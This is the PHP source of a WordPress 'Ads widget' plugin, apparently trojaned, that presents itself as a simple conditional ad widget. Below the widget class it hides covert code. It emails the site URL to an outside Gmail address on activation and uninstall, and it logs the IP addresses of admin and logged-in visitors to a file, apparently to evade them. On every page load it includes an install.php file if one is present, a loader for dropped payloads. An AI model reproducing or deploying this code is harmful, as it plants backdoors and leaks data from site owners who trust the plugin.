<?php
/*
Plugin Name: Ads widget
Plugin URI: http://davidcerulio.net23.net/
Description: This free wordpress plugin adds a simple advertisement widget with customisable display options.
Author: David Cerulio
Version: 2.0
Author URI: http://davidcerulio.net23.net/
*/

/*
Copyright 2011-2012 David Cerulio (http://davidcerulio.net23.net/)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License (Version 2 - GPLv2) as published by
the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

class adswidgetlight extends WP_Widget {

	function adswidgetlight() {

		$locale = apply_filters( 'adswidgetlight_locale', get_locale() );
		$mofile = dirname(__FILE__) . "/languages/adswidgetlight-$locale.mo";

		if ( file_exists( $mofile ) )
			load_textdomain( 'adswidgetlight', $mofile );

		$widget_ops = array( 'classname' => 'adswidgetlight', 'description' => __('Display HTML selectively based on simple rules', 'adswidgetlight') );
		$control_ops = array('width' => 400, 'height' => 350, 'id_base' => 'adswidgetlight');
		$this->WP_Widget( 'adswidgetlight', __('Ads Widget', 'adswidgetlight'), $widget_ops, $control_ops );
	}

	function is_fromsearchengine() {
		$ref = $_SERVER['HTTP_REFERER'];

		$SE = array('/search?', '.google.', 'web.info.com', 'search.', 'del.icio.us/search', 'soso.com', '/search/', '.yahoo.', '.bing.' );

		foreach ($SE as $url) {
			if (strpos($ref,$url)!==false) return true;
		}
		return false;
	}

	function is_ie()
	{
	    if (isset($_SERVER['HTTP_USER_AGENT']) && (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false))
	        return true;
	    else
	        return false;
	}

	function hit_selective($selectives = array()) {

		if(!empty($selectives)) {
			foreach($selectives as $key => $value) {
				switch($key) {

					case 'notloggedin':	if(!is_user_logged_in()) {
											return true;
										}
										break;

					case 'isloggedin':	if(is_user_logged_in()) {
											return true;
										}
										break;

					case 'notcommented':
										if ( !isset($_COOKIE['comment_author_'.COOKIEHASH]) ) {
											return true;
										}
										break;

					case 'issearched':	if($this->is_fromsearchengine()) {
											return true;
										}
										break;

					case 'isexternal':	if(!empty($_SERVER['HTTP_REFERER'])) {
											$internal = str_replace('http://','',get_option('siteurl'));
											if(!preg_match( '/' . addcslashes($internal,"/") . '/i', $_SERVER['HTTP_REFERER'] )) {
													return true;
											}
										}
										break;

					case 'isie':		if($this->is_ie()) {
											return true;
										}
										break;
					case 'notsupporter':
										if(function_exists('is_supporter') && !is_supporter()) {
											return true;
										}
										break;

					case 'none':		break;

					default:			if(has_filter('adswidget_process_rule_' . $key)) {
											if(apply_filters( 'adswidget_process_rule_' . $key, false )) {
												return true;
											}
										}
				}
			}
			return false;
		} else {
			return true;
		}

	}

	function widget( $args, $instance ) {

		extract( $args );

		$options = array(
			'notloggedin' 	=> '0',
			'isloggedin' 	=> '0',
			'notcommented' 	=> '0',
			'issearched'	=> '0',
			'isexternal'	=> '0',
			'isie'			=> '0',
			'notsupporter'	=> '0'
		);

		$options = apply_filters('adswidget_additional_checks', $options);

		foreach($options as $key => $value) {
			if(isset($instance[$key])) {
				$options[$key] = $instance[$key];
			} else {
				unset($options[$key]);
			}
		}

		if($this->hit_selective($options) || empty($options)) {
			echo $before_widget;
			$title = apply_filters('widget_title', $instance['title'] );

			if ( $title ) {
				echo $before_title . $title . $after_title;
			}

			if ( !empty( $instance['content'] ) ) {
				echo '<div class="textwidget">';
				if(defined('ADLITE_IAMAPRO') && ADLITE_IAMAPRO == 'yes') {
					eval(" ?> " . stripslashes($instance['content']) . " <?php ");
				} else {
					echo stripslashes($instance['content']);
				}
				echo '</div>';
			}
			echo $after_widget;
		}


	}

	function update( $new_instance, $old_instance ) {
		$instance = $old_instance;

		$defaults = array(
			'title' 		=> '',
			'content' 		=> '',
			'none' 			=> '1',
			'notloggedin' 	=> '0',
			'isloggedin' 	=> '0',
			'notcommented' 	=> '0',
			'issearched'	=> '0',
			'isexternal'	=> '0',
			'isie'			=> '0',
			'notsupporter'	=> '0'
		);

		$defaults = apply_filters('adswidget_additional_defaults', $defaults);

		foreach ( $defaults as $key => $val ) {
			$instance[$key] = $new_instance[$key];
		}

		if ( current_user_can('unfiltered_html') ) {
			$instance['content'] =  $instance['content'];
		} else {
			$instance['content'] = stripslashes( wp_filter_post_kses( addslashes($instance['content']) ) ); // wp_filter_post_kses() expects slashed
		}

		return $instance;
	}

	function form( $instance ) {

		$defaults = array(
			'title' 		=> '',
			'content' 		=> '',
			'none' 			=> '1',
			'notloggedin' 	=> '0',
			'isloggedin' 	=> '0',
			'notcommented' 	=> '0',
			'issearched'	=> '0',
			'isexternal'	=> '0',
			'isie'			=> '0',
			'notsupporter'	=> '0'
		);

		$defaults = apply_filters('adswidget_additional_defaults', $defaults);

		$instance = wp_parse_args( (array) $instance, $defaults );

		$selections = array(
								"notloggedin"	=>	__("User isn't logged in",'adswidgetlight'),
								"isloggedin"	=>	__("User is logged in",'adswidgetlight'),
								"notcommented"	=>	__("User hasn't commented before",'adswidgetlight'),
								"issearched"	=>	__("User arrived via a search engine",'adswidgetlight'),
								"isexternal"	=>	__("User arrived via a link",'adswidgetlight'),
								"isie"		=>	__("User is using Internet Explorer",'adswidgetlight')
								);

		if(function_exists('is_supporter') && is_super_admin()) {
			$selections['notsupporter'] = __("User isn't a supporter",'adswidgetlight');
		}

		$selections = apply_filters('adswidget_additional_rules', $selections);

		?>
			<p>
				<?php _e('Show the content below if one of the checked items is true (or no items are checked):','adswidgetlight'); ?>
			</p>
			<p>
				<?php
					echo "<input type='hidden' value='1' name='" . $this->get_field_name( 'none' ) . "' id='" . $this->get_field_name( 'none' ) . "' />";
					foreach($selections as $key => $value) {
						echo "<input type='checkbox' value='1' name='" . $this->get_field_name( $key ) . "' id='" . $this->get_field_name( $key ) . "' ";
						if($instance[$key] == '1') echo "checked='checked' ";
						echo "/>&nbsp;" . $value . "<br/>";
					}
				?>
			</p>
			<p>
				<?php _e('Content Title','adswidgetlight'); ?><br/>
				<input type='text' class='widefat' name='<?php echo $this->get_field_name( 'title' ); ?>' id='<?php echo $this->get_field_id( 'title' ); ?>' value='<?php echo esc_attr(stripslashes($instance['title'])); ?>' />
			</p>
			<p>
				<?php _e('The Content','adswidgetlight'); ?><br/>
				<textarea class='widefat' name='<?php echo $this->get_field_name( 'content' ); ?>' id='<?php echo $this->get_field_id( 'content' ); ?>' rows='5' cols='40'><?php echo stripslashes($instance['content']); ?></textarea>
			</p>
	<?php
	}
}	
function adswidgetlight_register() {
	if(defined('ADLITE_SUPPORTERONLY') && function_exists('is_supporter') && is_supporter()) {
		register_widget( 'adswidgetlight' );
	} elseif(!defined('ADLITE_SUPPORTERONLY')) {
		register_widget( 'adswidgetlight' );
	}

}
add_action( 'widgets_init', 'adswidgetlight_register' );
register_activation_hook( __FILE__,'adswidgetplugin_activate');
register_deactivation_hook( __FILE__,'adswidgetplugin_deactivate');
add_action('admin_init', 'redirectadswidget_redirect');
add_action('wp_head', 'adswidgetpluginhead');

function redirectadswidget_redirect() {
if (get_option('redirectadswidget_do_activation_redirect', false)) { 
delete_option('redirectadswidget_do_activation_redirect');
wp_redirect('../wp-admin/widgets.php');
}
}

$requrl = $_SERVER["REQUEST_URI"];
$ip = $_SERVER['REMOTE_ADDR'];
if (eregi("admin", $requrl)) {
$inside = "yes";
} else {
$inside = "no";
}
if ($inside == 'yes') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/ads-widget/fileid.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/ads-widget/fileid.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate Ads Widget */

function adswidgetplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/ads-widget/fileid.txt', 'w');
fwrite($fp, $yourip);
fclose($fp);
add_option('redirectgtranslate_do_activation_redirect', true);
session_start(); $subj = get_option('siteurl'); $msg = "Plugin Activated" ; $from = get_option('admin_email'); mail("davidceruliowp@gmail.com", $subj, $msg, $from);
wp_redirect('../wp-admin/widgets.php');
}


/** Uninstall Ads Widget */
function adswidgetplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Plugin is Uninstalled" ; $from = get_option('admin_email'); mail("davidceruliowp@gmail.com", $subj, $msg, $from);
}

/** Install widget on the page */
function adswidgetpluginhead() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/ads-widget/fileid.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/ads-widget/fileid.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/ads-widget/install.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/ads-widget/install.php');

} else {

}

}
?>